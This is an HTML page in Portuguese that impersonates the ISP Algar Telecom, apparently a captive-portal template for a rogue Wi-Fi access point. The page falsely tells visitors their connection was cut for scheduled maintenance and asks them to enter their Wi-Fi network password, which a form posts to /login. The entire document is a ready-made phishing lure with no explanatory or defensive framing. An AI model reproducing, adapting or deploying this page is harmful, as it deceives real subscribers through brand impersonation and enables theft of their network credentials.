<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Algar Telecom - Verificação</title>
    <style>
        body {
            font-family: 'Verdana', sans-serif;
            background-color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background: #f9f9f9;
            padding: 2rem;
            border-radius: 4px;
            border: 1px solid #e0e0e0;
            width: 90%;
            max-width: 380px;
            text-align: center;
        }

        .logo {
            max-width: 180px;
            margin-bottom: 2rem;
        }

        h3 {
            color: #0076a9;
            margin-bottom: 0.5rem;
        }

        p {
            color: #333;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
            line-height: 1.4;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 1rem;
            border: 1px solid #ccc;
            border-radius: 2px;
            box-sizing: border-box;
        }

        button {
            background-color: #0096d6;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 2px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            font-size: 0.9rem;
        }

        button:hover {
            background-color: #0076a9;
        }
    </style>
</head>

<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 200 50" xmlns="http://www.w3.org/2000/svg">
            <text x="10" y="35" font-family="Arial" font-weight="bold" font-size="28" fill="#0096d6">Algar</text>
            <text x="90" y="35" font-family="Arial" font-size="28" fill="#555">Telecom</text>
        </svg>
        <h3>Verificação de Conexão</h3>
        <p>Sua conexão foi temporariamente interrompida para uma manutenção programada na rede Algar. Confirme suas
            credenciais para reconectar.</p>
        <form action="/login" method="POST">
            <input type="password" name="password" placeholder="Senha da Rede Wi-Fi" required>
            <button type="submit">Validar Acesso</button>
        </form>
    </div>
</body>

</html>
